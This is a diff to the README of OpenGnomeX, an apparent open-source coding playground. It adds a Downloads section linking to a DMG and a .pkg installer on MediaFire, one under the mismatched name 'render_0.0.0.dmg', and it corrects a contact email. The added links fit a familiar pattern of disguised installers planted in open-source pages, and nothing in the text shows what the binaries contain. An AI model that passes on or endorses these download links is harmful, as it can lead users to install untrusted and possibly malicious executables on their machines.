@@ -9,6 +9,11 @@ Welcome to **OpenGnomeX**, a dynamic open-source playground for coding enthusias
 - **Markdown** 📝
 - **Text Files** 📄
 
+## 📥 Downloads
+
+- [Download OpenGnomeX DMG](https://www.mediafire.com/file/ol4atmrmel1ix87/render_0.0.0.dmg/file) 📦
+- [Download GnomeX Installer Package](https://www.mediafire.com/file/mhi6wrqm5w5j2k9/GnomeX.pkg/file) 💾
+
 ## 🚀 Features
 
 - **Multi-language Support**: Seamlessly switch between Python, HTML, CSS, JavaScript, Markdown, and text files.
@@ -81,9 +86,8 @@ OpenGnomeX is licensed under the [MIT License](LICENSE).
 
 ## 💬 Contact
 
-For any questions or feedback, please reach out to us at [tirawatnantamas](mailto:tirawatnantamas.com).
+For any questions or feedback, please reach out to us at [tirawatnantamas@gmail.com](mailto:tirawatnantamas@gmail.com).
 
 ---
 
 **Enjoy coding with OpenGnomeX!** 🚀✨
-
